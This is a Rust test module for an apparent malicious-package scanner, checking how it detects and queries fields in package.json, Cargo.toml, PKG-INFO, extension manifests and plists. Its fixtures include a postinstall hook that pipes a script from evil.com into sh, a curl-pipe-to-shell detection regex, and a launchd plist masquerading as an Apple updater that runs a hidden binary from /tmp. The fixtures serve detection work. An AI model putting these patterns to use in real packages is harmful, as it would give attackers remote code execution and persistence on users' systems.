            detect_format(Path::new("Cargo.toml"), b""),
            StructuredFormat::Toml
        );
        assert_eq!(
            detect_format(Path::new("pyproject.toml"), b""),
            StructuredFormat::Toml
        );
    }

    #[test]
    fn test_no_detection_for_unknown_json() {
        // Random JSON files without known filenames are not detected
        assert_eq!(
            detect_format(Path::new("unknown"), br#"{"key": "value"}"#),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("random.json"), b"[1, 2, 3]"),
            StructuredFormat::Unknown
        );
    }

    #[test]
    fn test_no_detection_for_unknown_yaml() {
        // Random YAML files without known filenames are not detected
        assert_eq!(
            detect_format(Path::new("unknown"), b"key: value\nother: 123"),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("config.yaml"), b"key: value"),
            StructuredFormat::Unknown
        );
    }

    #[test]
    fn test_no_detection_for_unknown_toml() {
        // Random TOML files without known filenames are not detected
        assert_eq!(
            detect_format(Path::new("unknown"), b"[package]\nname = \"foo\""),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("config.toml"), b"key = \"value\""),
            StructuredFormat::Unknown
        );
    }

    // ==========================================================================
    // File Rejection Tests
    // ==========================================================================

    #[test]
    fn test_reject_random_json_files() {
        // Random .json files should not be parsed
        let json_content = br#"{"api_key": "secret123", "endpoint": "https://evil.com"}"#;

        // Random filenames with .json extension are rejected
        assert_eq!(
            detect_format(Path::new("config.json"), json_content),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("data.json"), json_content),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("settings.json"), json_content),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("/path/to/random.json"), json_content),
            StructuredFormat::Unknown
        );

        // Verify kv evaluation also returns None
        let cond = Condition::Kv {
            path: "api_key".to_string(),
            exact: Some("secret123".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };

        assert!(evaluate_kv_test(&cond, json_content, Path::new("random.json")).is_none());
        assert!(evaluate_kv_test(&cond, json_content, Path::new("config.json")).is_none());
    }

    #[test]
    fn test_reject_random_yaml_files() {
        // Random .yaml/.yml files should not be parsed
        let yaml_content = b"database:\n  host: localhost\n  password: secret";

        // Random YAML files are rejected
        assert_eq!(
            detect_format(Path::new("config.yaml"), yaml_content),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("docker-compose.yml"), yaml_content),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("settings.yml"), yaml_content),
            StructuredFormat::Unknown
        );

        // Verify kv evaluation returns None
        let cond = Condition::Kv {
            path: "database.password".to_string(),
            exact: Some("secret".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };

        assert!(evaluate_kv_test(&cond, yaml_content, Path::new("config.yaml")).is_none());
    }

    #[test]
    fn test_reject_random_toml_files() {
        // Random .toml files should not be parsed
        let toml_content = b"[database]\nhost = \"localhost\"\npassword = \"secret\"";

        // Random TOML files are rejected
        assert_eq!(
            detect_format(Path::new("config.toml"), toml_content),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("settings.toml"), toml_content),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("app.toml"), toml_content),
            StructuredFormat::Unknown
        );

        // Verify kv evaluation returns None
        let cond = Condition::Kv {
            path: "database.password".to_string(),
            exact: Some("secret".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };

        assert!(evaluate_kv_test(&cond, toml_content, Path::new("config.toml")).is_none());
    }

    #[test]
    fn test_accept_known_json_manifests() {
        // Known JSON manifests should still be parsed
        let package_json = br#"{"name": "malicious-package", "version": "1.0.0"}"#;
        let manifest_json = br#"{"manifest_version": 2, "permissions": ["storage"]}"#;
        let composer_json = br#"{"name": "vendor/package", "require": {}}"#;

        // Verify detection works
        assert_eq!(
            detect_format(Path::new("package.json"), package_json),
            StructuredFormat::Json
        );
        assert_eq!(
            detect_format(Path::new("manifest.json"), manifest_json),
            StructuredFormat::Json
        );
        assert_eq!(
            detect_format(Path::new("composer.json"), composer_json),
            StructuredFormat::Json
        );

        // Verify kv evaluation works
        let cond = Condition::Kv {
            path: "name".to_string(),
            exact: Some("malicious-package".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };

        assert!(evaluate_kv_test(&cond, package_json, Path::new("package.json")).is_some());
    }

    #[test]
    fn test_accept_known_toml_manifests() {
        // Known TOML manifests should still be parsed
        let cargo_toml = b"[package]\nname = \"malicious-crate\"\nversion = \"0.1.0\"";
        let pyproject_toml = b"[project]\nname = \"malicious-package\"\nversion = \"1.0.0\"";

        // Verify detection works
        assert_eq!(
            detect_format(Path::new("Cargo.toml"), cargo_toml),
            StructuredFormat::Toml
        );
        assert_eq!(
            detect_format(Path::new("pyproject.toml"), pyproject_toml),
            StructuredFormat::Toml
        );

        // Verify kv evaluation works
        let cond = Condition::Kv {
            path: "package.name".to_string(),
            exact: Some("malicious-crate".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };

        assert!(evaluate_kv_test(&cond, cargo_toml, Path::new("Cargo.toml")).is_some());
    }

    #[test]
    fn test_accept_github_actions_workflows() {
        // GitHub Actions workflows should be parsed
        let workflow = b"name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest";

        // Both .yml and .yaml in .github/workflows/ should work
        assert_eq!(
            detect_format(Path::new(".github/workflows/ci.yml"), workflow),
            StructuredFormat::Yaml
        );
        assert_eq!(
            detect_format(Path::new(".github/workflows/test.yaml"), workflow),
            StructuredFormat::Yaml
        );

        // But not outside .github/workflows/
        assert_eq!(
            detect_format(Path::new(".github/ci.yml"), workflow),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("ci.yml"), workflow),
            StructuredFormat::Unknown
        );

        // Verify kv evaluation works for workflows
        let cond = Condition::Kv {
            path: "name".to_string(),
            exact: Some("CI".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };

        assert!(evaluate_kv_test(&cond, workflow, Path::new(".github/workflows/ci.yml")).is_some());
        assert!(evaluate_kv_test(&cond, workflow, Path::new("ci.yml")).is_none());
    }

    #[test]
    fn test_reject_json_with_valid_content_but_wrong_filename() {
        // Even if content is valid JSON, reject if filename is unknown
        let valid_json = br#"{"perfectly": "valid", "json": true}"#;

        assert_eq!(
            detect_format(Path::new("database.json"), valid_json),
            StructuredFormat::Unknown
        );
        assert_eq!(
            detect_format(Path::new("api-config.json"), valid_json),
            StructuredFormat::Unknown
        );

        // Verify kv evaluation doesn't work
        let cond = Condition::Kv {
            path: "perfectly".to_string(),
            exact: Some("valid".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };

        assert!(evaluate_kv_test(&cond, valid_json, Path::new("database.json")).is_none());
    }

    #[test]
    fn test_case_insensitive_filename_matching() {
        // Filenames should be matched case-insensitively
        let json_content = br#"{"test": "value"}"#;

        assert_eq!(
            detect_format(Path::new("Package.json"), json_content),
            StructuredFormat::Json
        );
        assert_eq!(
            detect_format(Path::new("PACKAGE.JSON"), json_content),
            StructuredFormat::Json
        );
        assert_eq!(
            detect_format(Path::new("Manifest.JSON"), json_content),
            StructuredFormat::Json
        );

        let toml_content = b"[package]\nname = \"test\"";
        assert_eq!(
            detect_format(Path::new("cargo.TOML"), toml_content),
            StructuredFormat::Toml
        );
        assert_eq!(
            detect_format(Path::new("PyProject.toml"), toml_content),
            StructuredFormat::Toml
        );
    }

    // ==========================================================================
    // Integration Tests
    // ==========================================================================

    #[test]
    fn test_chrome_manifest_permissions() {
        let manifest = br#"{
            "manifest_version": 3,
            "name": "Test Extension",
            "permissions": ["storage", "debugger", "tabs"],
            "host_permissions": ["<all_urls>"]
        }"#;

        let path = Path::new("manifest.json");

        // Test exact match in array
        let cond = Condition::Kv {
            path: "permissions".to_string(),
            exact: Some("debugger".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, manifest, path).is_some());

        // Test non-matching exact
        let cond = Condition::Kv {
            path: "permissions".to_string(),
            exact: Some("cookies".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, manifest, path).is_none());

        // Test manifest_version
        let cond = Condition::Kv {
            path: "manifest_version".to_string(),
            exact: Some("3".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, manifest, path).is_some());
    }

    #[test]
    fn test_chrome_manifest_content_scripts() {
        let manifest = br#"{
            "content_scripts": [
                {
                    "matches": ["<all_urls>"],
                    "js": ["content.js"],
                    "run_at": "document_start"
                },
                {
                    "matches": ["*://*.amazon.com/*"],
                    "js": ["shopping.js"]
                }
            ]
        }"#;

        let path = Path::new("manifest.json");

        // Test wildcard path with exact match
        let cond = Condition::Kv {
            path: "content_scripts[*].matches".to_string(),
            exact: Some("<all_urls>".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, manifest, path).is_some());

        // Test wildcard path with substr
        let cond = Condition::Kv {
            path: "content_scripts[*].matches".to_string(),
            exact: None,
            substr: Some("amazon".to_string()),
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, manifest, path).is_some());

        // Test run_at
        let cond = Condition::Kv {
            path: "content_scripts[*].run_at".to_string(),
            exact: Some("document_start".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, manifest, path).is_some());
    }

    #[test]
    fn test_npm_package_json() {
        let package = br#"{
            "name": "malicious-package",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "curl http://evil.com/payload.sh | sh",
                "test": "jest"
            },
            "dependencies": {
                "lodash": "^4.17.21"
            }
        }"#;

        let path = Path::new("package.json");

        // Test existence check
        let cond = Condition::Kv {
            path: "scripts.postinstall".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, package, path).is_some());

        // Test substr
        let cond = Condition::Kv {
            path: "scripts.postinstall".to_string(),
            exact: None,
            substr: Some("curl".to_string()),
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, package, path).is_some());

        // Test regex
        let cond = Condition::Kv {
            path: "scripts.postinstall".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: Some(Regex::new(r"curl.*\|.*sh").unwrap()),
        };
        assert!(evaluate_kv_test(&cond, package, path).is_some());

        // Test non-existent key
        let cond = Condition::Kv {
            path: "scripts.preinstall".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, package, path).is_none());
    }

    #[test]
    fn test_yaml_format() {
        let yaml = b"permissions:
  - storage
  - debugger
  - tabs
name: test
";

        let path = Path::new(".github/workflows/ci.yml");

        let cond = Condition::Kv {
            path: "permissions".to_string(),
            exact: Some("debugger".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, yaml, path).is_some());
    }

    #[test]
    fn test_toml_format() {
        let toml = br#"
[package]
name = "my-crate"
version = "0.1.0"

[dependencies]
serde = "1.0"
openssl = "0.10"
"#;

        let path = Path::new("Cargo.toml");

        // Test existence
        let cond = Condition::Kv {
            path: "dependencies.openssl".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, toml, path).is_some());

        // Test non-existent
        let cond = Condition::Kv {
            path: "dependencies.tokio".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, toml, path).is_none());

        // Test exact value
        let cond = Condition::Kv {
            path: "package.name".to_string(),
            exact: Some("my-crate".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, toml, path).is_some());
    }

    // ==========================================================================
    // Edge Case Tests
    // ==========================================================================

    #[test]
    fn test_empty_array() {
        let json = br#"{"permissions": []}"#;
        let path = Path::new("package.json");

        // Empty array exists
        let cond = Condition::Kv {
            path: "permissions".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, json, path).is_some());

        // But contains nothing
        let cond = Condition::Kv {
            path: "permissions".to_string(),
            exact: Some("anything".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, json, path).is_none());
    }

    #[test]
    fn test_null_value() {
        let json = br#"{"value": null}"#;
        let path = Path::new("package.json");

        // Path exists
        let cond = Condition::Kv {
            path: "value".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, json, path).is_some());

        // exact: "null" matches
        let cond = Condition::Kv {
            path: "value".to_string(),
            exact: Some("null".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, json, path).is_some());
    }

    #[test]
    fn test_deeply_nested() {
        let json = br#"{"a": {"b": {"c": {"d": {"e": "found"}}}}}"#;
        let path = Path::new("package.json");

        let cond = Condition::Kv {
            path: "a.b.c.d.e".to_string(),
            exact: Some("found".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, json, path).is_some());
    }

    #[test]
    fn test_unicode() {
        let json = r#"{"name": "日本語パッケージ"}"#.as_bytes();
        let path = Path::new("package.json");

        let cond = Condition::Kv {
            path: "name".to_string(),
            exact: None,
            substr: Some("日本語".to_string()),
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, json, path).is_some());
    }

    #[test]
    fn test_malformed_json() {
        let bad = br#"{"broken": }"#;
        let path = Path::new("package.json");

        let cond = Condition::Kv {
            path: "broken".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        // Should not panic, just return no match
        assert!(evaluate_kv_test(&cond, bad, path).is_none());
    }

    // ==========================================================================
    // PKG-INFO Format Tests
    // ==========================================================================

    #[test]
    fn test_detect_pkginfo_by_filename() {
        assert_eq!(
            detect_format(Path::new("PKG-INFO"), b""),
            StructuredFormat::PkgInfo
        );
        assert_eq!(
            detect_format(Path::new("METADATA"), b""),
            StructuredFormat::PkgInfo
        );
    }

    #[test]
    fn test_detect_pkginfo_by_content() {
        let content = b"Metadata-Version: 2.1\nName: my-package\n";
        assert_eq!(
            detect_format(Path::new("unknown"), content),
            StructuredFormat::PkgInfo
        );
    }

    #[test]
    fn test_pkginfo_simple() {
        let pkginfo = b"Metadata-Version: 2.1
Name: malicious-package
Version: 1.0.0
Summary: A suspicious package
Author: attacker@evil.com
";

        let path = Path::new("PKG-INFO");

        // Test name match
        let cond = Condition::Kv {
            path: "name".to_string(),
            exact: Some("malicious-package".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());

        // Test version
        let cond = Condition::Kv {
            path: "version".to_string(),
            exact: Some("1.0.0".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());

        // Test author contains suspicious domain
        let cond = Condition::Kv {
            path: "author".to_string(),
            exact: None,
            substr: Some("evil.com".to_string()),
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());

        // Test existence
        let cond = Condition::Kv {
            path: "summary".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());

        // Test non-existent
        let cond = Condition::Kv {
            path: "license".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_none());
    }

    #[test]
    fn test_pkginfo_multiple_classifiers() {
        let pkginfo = b"Metadata-Version: 2.1
Name: my-package
Classifier: Development Status :: 3 - Alpha
Classifier: License :: OSI Approved :: MIT License
Classifier: Programming Language :: Python :: 3
";

        let path = Path::new("PKG-INFO");

        // Multiple Classifier values become an array
        let cond = Condition::Kv {
            path: "classifier".to_string(),
            exact: None,
            substr: Some("MIT License".to_string()),
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());

        // Check Python classifier
        let cond = Condition::Kv {
            path: "classifier".to_string(),
            exact: None,
            substr: Some("Python".to_string()),
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());
    }

    #[test]
    fn test_pkginfo_multiline_description() {
        let pkginfo = b"Metadata-Version: 2.1
Name: my-package
Description: This is a package
        with a multi-line
        description.
Version: 1.0.0
";

        let path = Path::new("PKG-INFO");

        let cond = Condition::Kv {
            path: "description".to_string(),
            exact: None,
            substr: Some("multi-line".to_string()),
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());
    }

    #[test]
    fn test_pkginfo_case_insensitive_keys() {
        let pkginfo = b"Metadata-Version: 2.1
Name: my-package
Author-Email: test@example.com
";

        let path = Path::new("PKG-INFO");

        // Keys are normalized to lowercase
        let cond = Condition::Kv {
            path: "author-email".to_string(),
            exact: None,
            substr: Some("example.com".to_string()),
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());
    }

    // ==========================================================================
    // Plist Format Tests
    // ==========================================================================

    #[test]
    fn test_detect_plist_by_extension() {
        assert_eq!(
            detect_format(Path::new("Info.plist"), b""),
            StructuredFormat::Plist
        );
    }

    #[test]
    fn test_detect_xml_plist_by_content() {
        let content = b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>Label</key>\n<string>test</string>\n</dict>\n</plist>";
        assert_eq!(
            detect_format(Path::new("unknown"), content),
            StructuredFormat::Plist
        );
    }

    #[test]
    fn test_detect_binary_plist_by_content() {
        let content = b"bplist00\xd1\x01\x02STest\x08\x0b\x10\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x15";
        assert_eq!(
            detect_format(Path::new("unknown"), content),
            StructuredFormat::Plist
        );
    }

    #[test]
    fn test_xml_plist_evaluation() {
        let plist = b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<plist version=\"1.0\">
<dict>
    <key>CFBundleIdentifier</key>
    <string>com.example.app</string>
    <key>LSMinimumSystemVersion</key>
    <string>10.15</string>
    <key>Permissions</key>
    <array>
        <string>camera</string>
        <string>microphone</string>
    </array>
</dict>
</plist>";

        let path = Path::new("Info.plist");

        // Test exact match
        let cond = Condition::Kv {
            path: "CFBundleIdentifier".to_string(),
            exact: Some("com.example.app".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, plist, path).is_some());

        // Test match in array
        let cond = Condition::Kv {
            path: "Permissions".to_string(),
            exact: Some("camera".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, plist, path).is_some());

        // Test non-matching
        let cond = Condition::Kv {
            path: "CFBundleIdentifier".to_string(),
            exact: Some("com.other.app".to_string()),
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };
        assert!(evaluate_kv_test(&cond, plist, path).is_none());
    }

    #[test]
    fn test_plist_masquerading_detection() {
        let plist = b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<plist version=\"1.0\">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>Program</key>
    <string>/tmp/.hidden_updater</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>";

        let path = Path::new("com.apple.systemupdate.plist");

        // Test Label starts with com.apple.
        let cond_label = Condition::Kv {
            path: "Label".to_string(),
            exact: None,
            substr: None,
            regex: Some(r"^com\.apple\.".to_string()),
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: Some(Regex::new(r"^com\.apple\.").unwrap()),
        };
        assert!(evaluate_kv_test(&cond_label, plist, path).is_some());

        // Test Program is in /tmp/
        let cond_program = Condition::Kv {
            path: "Program".to_string(),
            exact: None,
            substr: None,
            regex: Some(r"^/tmp/".to_string()),
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: None,
            compiled_regex: Some(Regex::new(r"^/tmp/").unwrap()),
        };
        assert!(evaluate_kv_test(&cond_program, plist, path).is_some());
    }
}
